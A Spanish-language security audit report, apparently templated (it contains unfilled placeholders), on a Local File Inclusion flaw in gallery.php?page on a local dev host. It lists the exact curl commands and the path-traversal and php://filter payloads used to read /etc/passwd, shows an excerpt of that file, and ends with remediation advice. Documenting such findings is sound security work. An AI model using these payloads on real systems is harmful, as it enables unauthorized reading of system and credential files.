# Informe de auditoría LFI

Fecha: ${TS} UTC
Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
- Vulnerabilidad encontrada: Sí (Local File Inclusion en gallery.php?page)
- Explotación: Se obtuvo acceso a ficheros del sistema, incluyendo /etc/passwd (LFI explotado exitosamente).

Punto vulnerable:
- Archivo/endpoint: /gallery.php
- Parámetro vulnerable: page

Comandos ejecutados (evidencia exacta):
- curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd"
- curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../../etc/passwd"
- curl -s "http://web.dev.local:8081/gallery.php?page=/etc/passwd"
- curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd"

Payloads que permitieron descubrir ficheros de la aplicación y del sistema:
- ../../../../../../etc/passwd
- ../../../../../../../etc/passwd
- /etc/passwd
- php://filter/read=convert.base64-encode/resource=/etc/passwd

Evidencia (extracto de /etc/passwd obtenido):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

Impacto:
- Lectura de ficheros sensibles del sistema operativo (confidencialidad comprometida).
- Información útil para escalada de privilegios y movimientos laterales (por ejemplo, usuarios del sistema, rutas home, posibles ubicaciones de ficheros web y claves).

Recomendaciones:
- Validar y sanitizar estrictamente los parámetros que se usan para incluir/leer ficheros.
- Evitar incluir directamente valores controlados por el usuario; usar un mapeo de ficheros permitidos (whitelist).
- Deshabilitar wrappers peligrosos (php://) o validar su uso y asegurar que no permitan rutas absolutas.
- Asegurar permisos de fichero mínimos y segregar ficheros sensibles fuera del árbol web.

Comandos y herramientas utilizadas (resumen):
- curl para pruebas manuales y verificación de respuestas.
- Búsqueda manual de parámetros en la web objetivo y fuzzing básico con payloads de traversal y php://filter.

Archivo de salida: ${FILE}

